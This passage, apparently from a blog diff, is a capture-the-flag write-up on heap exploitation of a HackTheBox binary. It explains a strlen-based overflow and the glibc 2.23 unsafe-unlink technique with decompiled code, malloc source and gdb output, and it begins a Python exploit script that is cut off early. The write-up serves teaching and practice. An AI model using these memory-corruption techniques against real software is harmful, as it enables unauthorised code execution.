+  unsigned __int64 real_canary; // [rsp+18h] [rbp-8h]
+
+  real_canary = canary;
+  buf = 0LL;
+  printf("Index: ");
+  read(0, &buf, 4uLL);
+  v1 = atoi((const char *)&buf);
+  if ( v1 >= 0 && v1 <= 15 )
+  {
+    if ( ptr[v1] )
+    {
+      free(ptr[v1]);
+      ptr[v1] = 0LL;
+      puts("Done!");
+    }
+    else
+    {
+      puts("No double-free for you!");
+    }
+  }
+  else
+  {
+    puts("Out of bounds!");
+  }
+  return canary ^ real_canary;
+}</code></pre>
+<p>It reads the the index of the chunk smartly since it checks for the negative and OOB index and then it checks if there is a chunk which is not NULL’d already, if it’s not then it <code>free</code>‘s the allocated chunk and makes the <code>ptr[index] = 0</code> making the UAF out of option. But clearly, it didn’t NULL’d the <code>free</code>‘d region, so maybe it’ll be useful later.</p>
+<p>Lastly, we will check the <code>edit</code> function:-</p>
+<pre class=" language-C"><code class="language-C">unsigned __int64 edit()
+{
+  size_t v0; // ST08_8
+  int v2; // [rsp+4h] [rbp-1Ch]
+  __int64 buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  buf = 0LL;
+  printf("Index: ");
+  read(0, &buf, 4uLL);
+  v2 = atoi((const char *)&buf);
+  if ( v2 >= 0 && v2 <= 15 )
+  {
+    if ( ptr[v2] )
+    {
+      v0 = strlen(ptr[v2]);
+      printf("Data: ", &buf);
+      read_string(ptr[v2], v0);
+      puts("Done!");
+    }
+    else
+    {
+      puts("No UAF for you!");
+    }
+  }
+  else
+  {
+    puts("Out of bounds!");
+  }
+  return __readfsqword(0x28u) ^ v4;
+}</code></pre>
+<p>There’s something fishy here, first the length for the <code>read_string</code> is calculated by <code>strlen</code> and then it is reading the data into the allocated memory. So, what is the catch here? To be more subtle, we have to know that <code>strlen</code> decided the length of a string when a NULL byte is recognized, for example if we have a string <code>HELLO\x00</code>, here it has a NULL Byte in the end, so when <code>strlen(&quot;HELLO\x00&quot;)</code> would be done, the returning value will be 5. but what if the string is not terminated by NULL byte, now since we know that in the <code>edit</code> the length for the <code>read_string</code>, since the string is not terminated by the NULL byte as we see in the <code>read_string</code> below:- </p>
+<pre class=" language-C"><code class="language-C">ssize_t __fastcall read_string(void *a1, size_t a2)
+{
+  ssize_t result; // rax
+
+  result = read(0, a1, a2);
+  if ( (signed int)result <= 0 )
+  {
+    puts("Read error!");
+    exit(-1);
+  }
+  return result;
+}</code></pre>
+<p>Now, it’ll calculate the data only if when the NULL byte will be encountered, there’s a off by one(kind of) vulnerability we can use. Without further ado, let’s move on.</p>
+<h1 id="Unsafe-Unlink"><a href="#Unsafe-Unlink" class="headerlink" title="Unsafe Unlink"></a>Unsafe Unlink</h1><p>To get along with this, since the given hint was <code>Xenial Xerus</code> which is the name of the <code>Ubuntu 16.04</code> which uses the LIBC-2.23 which, i back then had many low security checks for the heap internals, taking advantage of one of these loose checks within the <code>malloc.c</code>, we will be seeing it soon enough, the technique we will use here would be <code>Unsafe Unlink</code>, first of we will see what it is and how we will use it. To be precise, it is used when we have the global pointer address is known, in this case it’d be <code>ptr</code>, to understand it more, we will be seeing it in practice in next section, this is more of just an introduction to unlink. So, first of all, we see the following example of the <code>Unsafe Unlink</code> from <code>how2heap</code> repository:-</p>
+<blockquote>
+<p>NOTE: This technique is not applicable on fastbin chunks.</p>
+</blockquote>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">11</span><span class="token operator">:</span><span class="token number">19</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> glibc_2<span class="token number">.25</span> <span class="token punctuation">(</span>master %<span class="token punctuation">)</span><span class="token operator">></span> .<span class="token operator">/</span>unsafe_unlink 
+Welcome to unsafe unlink <span class="token number">2.0</span><span class="token operator">!</span>
+Tested <span class="token keyword">in</span> Ubuntu <span class="token number">14.04</span><span class="token operator">/</span><span class="token number">16.04</span> 64bit.
+This technique can be used when you have a pointer at a known location to a region you can call unlink on.
+The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
+The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.
+
+The global chunk0_ptr is at <span class="token number">0x602070</span><span class="token punctuation">,</span> pointing to <span class="token number">0x12ee010</span>
+The victim chunk we are going to corrupt is at <span class="token number">0x12ee0a0</span>
+
+We create a fake chunk inside chunk0.
+We setup the <span class="token string">'next_free_chunk'</span> <span class="token punctuation">(</span>fd<span class="token punctuation">)</span> of our fake chunk to point near to <span class="token operator">&amp;</span>chunk0_ptr so that P<span class="token operator">-></span>fd<span class="token operator">-></span>bk <span class="token operator">=</span> P.
+We setup the <span class="token string">'previous_free_chunk'</span> <span class="token punctuation">(</span>bk<span class="token punctuation">)</span> of our fake chunk to point near to <span class="token operator">&amp;</span>chunk0_ptr so that P<span class="token operator">-></span>bk<span class="token operator">-></span>fd <span class="token operator">=</span> P.
+With this setup we can pass this check<span class="token operator">:</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> P<span class="token operator">-></span>bk<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">)</span> <span class="token operator">==</span> False
+Fake chunk fd<span class="token operator">:</span> <span class="token number">0x602058</span>
+Fake chunk bk<span class="token operator">:</span> <span class="token number">0x602060</span>
+
+We assume that we have an overflow <span class="token keyword">in</span> chunk0 so that we can freely change chunk1 metadata.
+We shrink the size of chunk0 <span class="token punctuation">(</span>saved as <span class="token string">'previous_size'</span> <span class="token keyword">in</span> chunk1<span class="token punctuation">)</span> so that free will think that chunk0 starts where we placed our fake chunk.
+It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
+If we had <span class="token string">'normally'</span> freed chunk0<span class="token punctuation">,</span> chunk1.previous_size would have been <span class="token number">0x90</span><span class="token punctuation">,</span> however this is its new value<span class="token operator">:</span> <span class="token number">0x80</span>
+We mark our fake chunk as free by setting <span class="token string">'previous_in_use'</span> of chunk1 as False.
+
+Now we free chunk1 so that consolidate backward will unlink our fake chunk<span class="token punctuation">,</span> overwriting chunk0_ptr.
+You can find the source of the unlink macro at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>sourceware.org<span class="token operator">/</span>git<span class="token operator">/</span>?p<span class="token operator">=</span>glibc.git<span class="token punctuation">;</span>a<span class="token operator">=</span>blob<span class="token punctuation">;</span>f<span class="token operator">=</span>malloc<span class="token operator">/</span>malloc.c<span class="token punctuation">;</span>h<span class="token operator">=</span>ef04360b918bceca424482c6db03cc5ec90c3e00<span class="token punctuation">;</span>hb<span class="token operator">=</span>07c18a008c2ed8f5660adba2b778671db159a141<span class="token comment" spellcheck="true">#l1344</span>
+v
+At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
+chunk0_ptr is now pointing where we want<span class="token punctuation">,</span> we use it to overwrite our victim string.
+Original value<span class="token operator">:</span> Hello<span class="token operator">!</span><span class="token operator">~</span>
+New Value<span class="token operator">:</span> BBBBAAAA</code></pre>
+<p>The binary speak for itself, but let’s see, first of all we have a global array which contains the pointers to the allocated memory regions stored in the heap. Here, we have the global pointer stored at <code>0x602070</code> stored in the BSS region, now according to the example, it is pointing to the <code>0x12ee010</code> which is the first allocated chunk, next the victim chunk here is <code>0x12ee0a0</code>, when the example says it creates a fake chunk withing the <code>chunk0</code> it means we are creating a fake <code>free</code>‘d chunk, which looks like:-</p>
+<pre class=" language-r"><code class="language-r">    chunk<span class="token operator">-></span> <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span>
+        <span class="token operator">|</span>             Size of previous chunk                            <span class="token operator">|</span>
+        <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span>
+    `head<span class="token operator">:</span>' <span class="token operator">|</span>             Size of chunk<span class="token punctuation">,</span> <span class="token keyword">in</span> bytes                         <span class="token operator">|</span>P<span class="token operator">|</span>
+      mem<span class="token operator">-></span> <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span>
+        <span class="token operator">|</span>             Forward pointer to <span class="token keyword">next</span> chunk <span class="token keyword">in</span> list             <span class="token operator">|</span>
+        <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span>
+        <span class="token operator">|</span>             Back pointer to previous chunk <span class="token keyword">in</span> list            <span class="token operator">|</span>
+        <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span>
+        <span class="token operator">|</span>             Unused space <span class="token punctuation">(</span>may be <span class="token number">0</span> bytes long<span class="token punctuation">)</span>                .
+        .                                                               .
+        .                                                               <span class="token operator">|</span>
+nextchunk<span class="token operator">-></span> <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span>
+    `foot<span class="token operator">:</span>' <span class="token operator">|</span>             Size of chunk<span class="token punctuation">,</span> <span class="token keyword">in</span> bytes                           <span class="token operator">|</span>
+        <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span></code></pre>
+<p>We create a fake chunk where the <code>fd</code> pointer points to the <code>0x602058</code> and the <code>bk</code> pointer points to the <code>0x602060</code>, as mentioned the example assumes we have overflow to manipulate the metadata of chunk i.e. <code>prev_size</code> and <code>size</code> or even <code>fd</code> or <code>bk</code>, in the example it clears out the <code>PREV_IN_USE</code> which is responsible for indicating if the chunk is in use or not by the program in one way or another. So, after that when we free the chunk we clear the <code>PREV_IN_USE</code> bit off, since we added a fake in the chunk before that, the heap manager will try to unlink the free’d chunk to make the heap more efficient for the next allocation. In the GLIBC-2.23 has the unlink mechanism as follows:-</p>
+<pre class=" language-r"><code class="language-r">    <span class="token operator">/</span><span class="token operator">*</span> consolidate backward <span class="token operator">*</span><span class="token operator">/</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_inuse<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      prevsize <span class="token operator">=</span> p<span class="token operator">-></span>prev_size<span class="token punctuation">;</span>
+      size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>
+      p <span class="token operator">=</span> chunk_at_offset<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>long<span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      unlink<span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>What we would be doing is the same as backward consolidation, going over this piece of the code we see that the it first checks if the <code>prev_inuse</code> is not 0, then it gets the <code>prev_size</code> from the chunk header, next it gets the  chunk offset and then calls the <code>unlink</code>, let’s see the <code>unlink</code> snippet.</p>
+<pre class=" language-r"><code class="language-r"><span class="token comment" spellcheck="true">#define unlink(AV, P, BK, FD) {                                            \</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>__builtin_expect <span class="token punctuation">(</span>chunksize<span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> prev_size <span class="token punctuation">(</span>next_chunk<span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \
+      malloc_printerr <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  \
+    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>                                      \
+    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>                                      \
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>__builtin_expect <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              \
+      malloc_printerr <span class="token punctuation">(</span><span class="token string">"corrupted double-linked list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre>
+<p>To be precise, we need to get through the 2 checks to call unlink for our exploit, those checks include:-</p>
+<ul>
+<li>The <code>prev_size</code> should not be equal to the size of the next chunk.</li>
+<li>Then the other check is <code>FD</code> here is the <code>fd</code> address pointed by our chunk and vice versa should point to the chunk itself.</li>
+</ul>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Theories aside, it’s time to go into the exploitation phase, let’s create a exploit template to interact with the service:-</p>
+<pre class=" language-py"><code class="language-py">from roppy import *
+
+def allocate(size, data):
+    p.sendlineafter(">> ", "1")
+    p.sendlineafter(": ", str(size))
+    p.sendlineafter(": ", data)
+
+
+def edit(idx, data):
+    p.sendlineafter(">> ", "2")
+    p.sendlineafter(": ", str(idx))
+    p.sendlineafter(": ", data)
+
+
+def delete(idx):
+    p.sendlineafter(">> ", "3")
+    p.sendlineafter(": ", str(idx))
+
+def exploit():
+    # exploit
+
+if __name__ == '__main__':
+    p = process("./chapter1")
+    elf = ELF("chapter1")
+    exploit()</code></pre>
+<p>So, next up, we will allocate chunks, five chunks would be good, of same size:-</p>
+<pre class=" language-py"><code class="language-py">log.info("Created 5 chunks of size: 0x88")
+allocate(0x88, "A"*0x88)
+allocate(0x88, "B"*0x88)
+allocate(0x88, "C"*0x88)
+allocate(0x88, "D"*0x88)
+allocate(0x88, "E"*0x88)</code></pre>
+<p>Now, we will run the exploit and see the chunks in gdb:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span> <span class="token punctuation">[</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">11</span><span class="token operator">:</span><span class="token number">04</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> python3 chapter1.py 
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting program <span class="token string">'./chapter1'</span><span class="token operator">:</span> PID <span class="token number">2417</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>media<span class="token operator">/</span>sf_Pwning<span class="token operator">/</span>HackTheBox<span class="token operator">/</span>chapter1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>home<span class="token operator">/</span>vagrant<span class="token operator">/</span>tools<span class="token operator">/</span>LibcSearcher<span class="token operator">/</span>libc<span class="token operator">-</span>database<span class="token operator">/</span>db<span class="token operator">/</span>libc6_2<span class="token number">.23</span><span class="token operator">-</span>0ubuntu10_amd64.so
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Created <span class="token number">5</span> chunks of size<span class="token operator">:</span> <span class="token number">0x88</span>
+
+<span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+
+gef➤  heap chunks
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x1945010</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x0000000001945010</span>     <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>    AAAAAAAAAAAAAAAA<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x19450a0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x00000000019450a0</span>     <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span>    BBBBBBBBBBBBBBBB<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x1945130</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x0000000001945130</span>     <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span>    CCCCCCCCCCCCCCCC<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x19451c0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x00000000019451c0</span>     <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span> <span class="token number">44</span>    DDDDDDDDDDDDDDDD<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x1945250</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x0000000001945250</span>     <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span>    EEEEEEEEEEEEEEEE<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x19452e0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20d30</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>  ←  top chunk
+
+gef➤  x<span class="token operator">/</span>10xg <span class="token number">0x6020c0</span>
+<span class="token number">0x6020c0</span><span class="token operator">:</span>    <span class="token number">0x0000000001945010</span>    <span class="token number">0x00000000019450a0</span>
+<span class="token number">0x6020d0</span><span class="token operator">:</span>    <span class="token number">0x0000000001945130</span>    <span class="token number">0x00000000019451c0</span>
+<span class="token number">0x6020e0</span><span class="token operator">:</span>    <span class="token number">0x0000000001945250</span>    <span class="token number">0x0000000000000000</span>
+</code></pre>
+<p>Here, we have 5 chunks on the heap with the size <code>0x90</code> and then we have a global array having the pointers of the allocated chunk. Our target is to get control of the <code>0x6020c0</code> global array, so that we can manipulate the pointers stored within to it to get r/w primitive.</p>
+<p>The plan here is to forge a fake chunk, such that we can point the <code>fd</code> and <code>bk</code> to the global array, this will be done with:-</p>
+<pre class=" language-py"><code class="language-py">log.info("Preparing a fake chunk...")
+payload = p64(0x0)*2
